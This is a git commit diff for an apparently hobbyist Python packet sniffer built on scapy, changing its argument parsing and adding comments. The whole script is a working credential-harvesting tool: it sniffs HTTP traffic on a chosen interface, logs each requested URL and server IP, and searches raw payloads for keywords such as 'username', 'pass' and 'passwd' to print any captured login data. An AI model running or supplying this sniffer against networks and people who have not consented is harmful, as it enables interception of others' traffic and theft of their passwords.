fe88aa9180ca47115151a69db5269a8345f27afb
Saher Muhamed <81532683+SaherMuhamed@users.noreply.github.com>
2023-09-17 21:15:39 +0300

    Update packet_sniffer.py

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -2,7 +2,7 @@
 
 import scapy.all as scapy
 from scapy.layers import http
-from optparse import OptionParser
+from argparse import ArgumentParser
 from colorama import Fore
 import sys
 
@@ -13,45 +13,47 @@ if sys.version_info < (3, 0):
 
 
 def ascii_console_art():
-    print('''
-  _____            _        _          _  ___  ___ 
+    print("""
+  _____            _        _          _  ___  ___
 (_____ \          | |      | |        (_)/ __)/ __)
- _____) )___  ____| |  _    \ \  ____  _| |__| |__ 
+ _____) )___  ____| |  _    \ \  ____  _| |__| |__
 |  ____/ _  |/ ___) | / )    \ \|  _ \| |  __)  __)
-| |   ( ( | ( (___| |< ( _____) ) | | | | |  | |   
-|_|    \_||_|\____)_| \_|______/|_| |_|_|_|  |_|   
-''')
+| |   ( ( | ( (___| |< ( _____) ) | | | | |  | |
+|_|    \_||_|\____)_| \_|______/|_| |_|_|_|  |_|
+""")
     print('Network packet sniffer, developed and coded by Saher Muhamed - version 1.0.1')
     print('============================================================================')
 
 
-def get_arguments():
-    parser = OptionParser()
-    parser.add_option('-i', '--interface', dest='iface', help='specify you card interface, run (ifconfig)')
-    (options, arguments) = parser.parse_args()
+def args():
+    parser = ArgumentParser()
+    parser.add_argument('-i', '--interface', dest='iface', help='specify you card interface, run (ifconfig)')
+    options = parser.parse_args()
     if not options.iface:
         parser.error("[-] Please specify a valid interface card, or type it correctly, ex: --interface wlan0")
     return options
 
 
 def sniff(interface):
-    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    scapy.sniff(iface=interface, store=False,
+                prn=process_sniffed_packet)  # store=False that tells scapy do not store flowing packets in memory so
+    # that it doesn't cause too much pressure on our machine
 
 
 def process_sniffed_packet(packet):
-    if packet.haslayer(http.HTTPRequest):
-        print(Fore.WHITE + f'[+] Server IP ==> {str(packet[scapy.IP].dst)}')
+    if packet.haslayer(http.HTTPRequest):  # check if a packet contains any layers (http)
         url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        print(Fore.WHITE + f'[+] Url discovered ==> {url}')
-        if packet.haslayer(scapy.Raw):
+        print(Fore.RESET + "[+] HTTP Request ==> " + str(url) + " is at " + str(packet[scapy.IP].dst))  # print
+        # possible urls and it's ip addresses
+
+        if packet.haslayer(scapy.Raw):  # check if a packet contains any layers (raw)
             load = str(packet[scapy.Raw].load)
-            keywords = ['uname', 'username', 'login', 'usr', 'usrname', 'pass', 'email', 'password']
+            keywords = ['uname', 'username', 'login', 'usr', 'usrname', 'pass', 'email', 'password', 'passwd']
             for keyword in keywords:
                 if keyword in load:
-                    print(Fore.YELLOW + f'[+] Possible credentials ==> {load}')
+                    print(Fore.YELLOW + "\n[+] Possible credentials ==> " + load + "\n")
                     break
 
 
 ascii_console_art()
-my_interface = get_arguments()
-sniff(interface=my_interface.iface)
+sniff(interface=args().iface)
